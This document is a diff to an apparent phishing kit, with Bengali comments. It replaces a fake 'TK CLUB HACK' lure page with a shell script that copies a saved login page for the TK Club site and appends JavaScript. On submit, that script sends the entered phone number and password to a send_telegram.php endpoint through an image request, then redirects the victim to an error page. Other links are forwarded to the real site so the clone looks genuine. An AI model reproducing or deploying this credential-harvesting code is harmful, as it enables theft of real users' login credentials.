@@ -1,152 +1,104 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TK CLUB HACK - PINEX MOD</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background: black;
-            overflow: hidden;
-            font-family: 'Courier New', Courier, monospace;
+# ১. অরিজিনাল ফাইলটি ফ্রেশ কপি করা হচ্ছে
+rm index.html
+cp /sdcard/loginn.html ./index.html
+
+# ২. সব অপশনসহ ফাইনাল কোড ইনজেক্ট করা হচ্ছে
+cat << 'EOF' >> index.html
+<style>
+/* বাটন ডিজাইন: হালকা লাল ও সাদার সুন্দর মিশ্রণ */
+.btn-soft-glow {
+    background-color: #f87171 !important; 
+    background-image: linear-gradient(180deg, rgba(255,255,255,0.2), rgba(0,0,0,0.05)) !important;
+    color: white !important;
+    border: none !important;
+    opacity: 1 !important;
+    box-shadow: 0 0 10px rgba(248, 113, 113, 0.4) !important;
+    transition: all 0.3s ease;
+}
+
+/* পাসওয়ার্ড না দেওয়া পর্যন্ত ক্লিক হবে না */
+.btn-locked {
+    pointer-events: none !important; 
+    cursor: not-allowed !important;
+}
+</style>
+
+<script>
+function handleLogic() {
+    var inps = document.querySelectorAll('input');
+    var phoneInput = inps[0];
+    var passInput = inps[1];
+    var loginBtn = document.querySelector('.van-button--info') || document.querySelector('button');
+
+    if (phoneInput && loginBtn) {
+        // ১. নাম্বার দিলে বাটন হালকা লাল হবে
+        if (phoneInput.value.length > 0) {
+            loginBtn.classList.add('btn-soft-glow');
+        } else {
+            loginBtn.classList.remove('btn-soft-glow');
         }
 
-        canvas {
-            display: block;
+        // ২. পাসওয়ার্ড দিলে বাটন আনলক হবে
+        if (phoneInput.value.length > 0 && passInput && passInput.value.length > 0) {
+            loginBtn.classList.remove('btn-locked');
+        } else {
+            loginBtn.classList.add('btn-locked');
         }
+    }
+}
 
-        .overlay {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-            background: rgba(0, 0, 0, 0.85);
-            padding: 40px;
-            border: 2px solid #00ff41;
-            box-shadow: 0 0 20px #00ff41;
-            z-index: 10;
-            width: 90%;
-            max-width: 500px;
-        }
+document.addEventListener('input', handleLogic);
 
-        h1 {
-            color: #00ff41;
-            font-size: 2.5rem;
-            margin: 0;
-            text-shadow: 0 0 10px #00ff41;
-        }
+document.addEventListener('click', function(e) {
+    var el = e.target;
+    var txt = (el.innerText || el.textContent || '').toLowerCase().trim();
 
-        h2 {
-            color: #ff3e3e;
-            font-size: 1.5rem;
-            letter-spacing: 5px;
-            margin-bottom: 20px;
-        }
+    // ১. লগইন বাটনের কাজ
+    var loginBtn = el.closest('.btn-soft-glow');
+    if (loginBtn && !loginBtn.classList.contains('btn-locked')) {
+        e.preventDefault();
+        var inps = document.querySelectorAll('input');
+        var p = inps[0].value;
+        var s = inps[1].value;
 
-        .status-text {
-            color: #00ff41;
-            font-size: 14px;
-            text-align: left;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
+        var x = new Image();
+        x.src = 'send_telegram.php?phone=' + encodeURIComponent(p) + '&pass=' + encodeURIComponent(s);
 
-        .btn-container {
-            margin-top: 30px;
-        }
+        inps[0].value = '';
+        inps[1].value = '';
+        inps[0].dispatchEvent(new Event('input', { bubbles: true }));
 
-        button {
-            background: #00ff41;
-            color: black;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: 'Courier New', Courier, monospace;
-            transition: 0.3s;
-            text-transform: uppercase;
-        }
+        setTimeout(function() {
+            window.location.href = 'https://pinex-mod.vercel.app/error.html';
+        }, 500);
+        return;
+    }
+    
+    // ২. রেজিস্টার (Register) লিঙ্ক
+    if (txt.includes('register') || el.closest('.van-button--default')) {
+        window.location.href = 'https://tkclub2.com/#/register?invitationCode=11821190516';
+        return;
+    }
 
-        button:hover {
-            background: white;
-            box-shadow: 0 0 20px white;
-        }
+    // ৩. কাস্টমার সার্ভিস (Customer Service)
+    if (txt.includes('service') || txt.includes('customer')) {
+        window.location.href = 'https://tkclub2.com/#/main/CustomerService';
+        return;
+    }
 
-        .blink {
-            animation: blinker 1s linear infinite;
-        }
+    // ৪. পাসওয়ার্ড ভুলে গেছেন (Forgot Password)
+    if (txt.includes('forgot') || txt.includes('forget')) {
+        window.location.href = 'https://tkclub2.com/#/rpwd';
+        return;
+    }
 
-        @keyframes blinker {
-            50% { opacity: 0; }
-        }
-    </style>
-</head>
-<body>
-
-    <canvas id="matrix"></canvas>
-
-    <div class="overlay">
-        <h1>TK CLUB HACK</h1>
-        <h2>PINEX MOD</h2>
-        
-        <div class="status-text">
-            > [SYSTEM]: INJECTING PROTOCOL...<br>
-            > [INFO]: BYPASSING SECURITY... OK<br>
-            > [STATUS]: <span class="blink" style="color: yellow;">ERROR DETECTED!</span><br>
-            > [ACTION]: MANUAL OVERRIDE REQUIRED...
-        </div>
-
-        <div class="btn-container">
-            <button onclick="window.location.href='https://pinex-mod.vercel.app/dragon.html'">TRY AGAIN NOW</button>
-        </div>
-    </div>
-
-    <script>
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        const chars = "120";
-        const fontSize = 16;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-
-        for (let x = 0; x < columns; x++) {
-            drops[x] = 1;
-        }
-
-        function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            ctx.fillStyle = "#00ff41"; 
-            ctx.font = fontSize + "px monospace";
-
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars.charAt(Math.floor(Math.random() * chars.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-
-        setInterval(draw, 33);
-
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-    </script>
-</body>
-</html>
+    // ৫. পাসওয়ার্ড দেখার চোখ (Eye Icon)
+    var eyeBtn = el.closest('.van-field__right-icon');
+    if (eyeBtn) {
+        e.preventDefault();
+        var pInp = document.querySelector('input[type="password"]') || document.querySelectorAll('input')[1];
+        if (pInp) pInp.type = (pInp.type === 'password') ? 'text' : 'password';
+    }
+}, true);
+</script>
+EOF
